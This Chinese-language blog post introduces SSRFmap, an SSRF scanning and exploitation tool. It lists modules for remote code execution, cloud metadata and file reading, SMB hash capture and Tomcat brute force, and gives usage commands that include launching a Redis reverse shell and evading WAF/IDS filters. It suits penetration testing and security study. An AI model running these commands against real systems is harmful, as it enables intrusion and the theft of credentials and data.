---
title: SSRF漏洞自动扫描与利用工具
date: 2024-3-19 13:16:46
tags:
- 渗透工具推荐
categories:
- 工具推荐
---



## 简介

SSRF 通常用于利用其他服务上的操作，该框架旨在轻松查找和利用这些服务。SSRFmap 将 Burp 请求文件作为输入和模糊测试的参数。

## Github链接:

https://github.com/swisskyrepo/SSRFmap



## 模块

以下模块已实现并且可以与`-m`参数一起使用。

| 名称           | 描述                                       |
| -------------- | ------------------------------------------ |
| `fastcgi`      | FastCGI 远程代码执行                       |
| `redis`        | Redis 远程代码执行                         |
| `github`       | Github 企业 RCE < 2.8.7                    |
| `zabbix`       | Zabbix 远程代码执行                        |
| `mysql`        | MySQL命令执行                              |
| `postgres`     | Postgres 命令执行                          |
| `docker`       | 通过 API 泄露 Docker 信息                  |
| `smtp`         | SMTP发送邮件                               |
| `portscan`     | 扫描主机的前 8000 个端口                   |
| `networkscan`  | HTTP Ping 扫描网络                         |
| `readfiles`    | 读取文件，例如`/etc/passwd`                |
| `alibaba`      | 从提供者读取文件（例如：元数据、用户数据） |
| `aws`          | 从提供者读取文件（例如：元数据、用户数据） |
| `gce`          | 从提供者读取文件（例如：元数据、用户数据） |
| `digitalocean` | 从提供者读取文件（例如：元数据、用户数据） |
| `socksproxy`   | SOCKS4代理                                 |
| `smbhash`      | 通过 UNC 路径强制 SMB 身份验证             |
| `tomcat`       | 针对 Tomcat Manager 的暴力攻击             |
| `custom`       | 将自定义数据发送到监听服务，例如：netcat   |
| `memcache`     | 将数据存储在 memcache 实例中               |

## 安装和手册

从 Github 存储库进行基本安装。

```shell
$ git clone https://github.com/swisskyrepo/SSRFmap.git
$ cd SSRFmap/
$ pip3 install -r requirements.txt
$ python3 ssrfmap.py

  usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]
                    [-v [VERBOSE]] [--lhost LHOST] [--lport LPORT]
                    [--uagent USERAGENT] [--ssl [SSL]] [--level [LEVEL]]

  optional arguments:
    -h, --help          show this help message and exit
    -r REQFILE          SSRF Request file
    -p PARAM            SSRF Parameter to target
    -m MODULES          SSRF Modules to enable
    -l HANDLER          Start an handler for a reverse shell
    -v [VERBOSE]        Enable verbosity
    --lhost LHOST       LHOST reverse shell
    --lport LPORT       LPORT reverse shell
    --uagent USERAGENT  User Agent to use
    --ssl [SSL]         Use HTTPS without verification
    --proxy PROXY       Use HTTP(s) proxy (ex: http://localhost:8080)
    --level [LEVEL]     Level of test to perform (1-5, default: 1)
```



## 例子

首先，您需要一个带有参数的请求来进行模糊测试，Burp 请求与 SSRFmap 配合良好。它们应该如下所示。**/data**文件夹中提供了更多示例。

```
POST /ssrf HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mysimple.ssrf/
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Connection: close
Upgrade-Insecure-Requests: 1

url=https%3A%2F%2Fwww.google.fr
```



使用`-m`后跟模块名称（`,`如果要启动多个模块，则用 ',' 分隔）。

```
# Launch a portscan on localhost and read default files
python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan
```



如果您需要自定义用户代理，请使用`--uagent`. 某些目标将使用 HTTPS，您可以使用 启用它`--ssl`。

```
# Launch a portscan against an HTTPS endpoint using a custom user-agent
python ssrfmap.py -r data/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
```



有些模块允许您创建回连，您必须指定 LHOST 和 LPORT。SSRFmap 还可以侦听传入的反向 shell。

```
# Triggering a reverse shell on a Redis
python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242

# -l create a listener for reverse shell on the specified port
# --lhost and --lport work like in Metasploit, these values are used to create a reverse shell payload
```



当目标受 WAF 或某些过滤器保护时，您可以尝试使用参数的各种有效负载和编码`--level`。

```
# --level : ability to tweak payloads in order to bypass some IDS/WAF. e.g: 127.0.0.1 -> [::] -> 0000: -> ...
```



## SSRFmap 测试



可以使用 SSRF 服务来快速测试框架`data/example.py`。

```
FLASK_APP=data/example.py flask run &
python ssrfmap.py -r data/request.txt -p url -m readfiles
```